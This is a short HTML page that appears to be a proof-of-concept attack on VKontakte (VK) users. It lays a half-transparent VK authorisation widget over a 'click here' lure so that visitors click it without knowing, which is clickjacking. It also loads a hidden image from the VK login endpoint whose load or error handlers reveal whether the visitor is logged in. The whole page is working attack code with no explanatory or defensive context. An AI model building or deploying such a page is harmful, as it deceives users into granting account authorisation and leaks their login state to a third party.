<script src="http://vk.com/js/api/openapi.js"></script>


<h1>click here</h1>
<div id="overlay">
	<img src="http://vkontakte.ru/login.php?to=ZmF2aWNvbi5pY28" onload="alert('good')" onerror="alert('bad')" width=0>
	</img>
	<div id="wrap1">
		<div id="wrap2">
			<div id="vk_auth"></div >
		</div>
	</div>
</div>

<style>
		#overlay {
			width: 100%;
			height: 100%;
			/*position: absolute;*/
			top: 0;
			left: 0;
			cursor: pointer;
			z-index: 100;
		}
		#wrap1 {
			overflow: hidden;
			width: 180px;
			height: 25px;
			opacity: 0.5;
			position: absolute;
			z-index: 101;
		
		}
		#wrap2 {
			margin-left: -10px;
			margin-top: -75px;
		}
</style>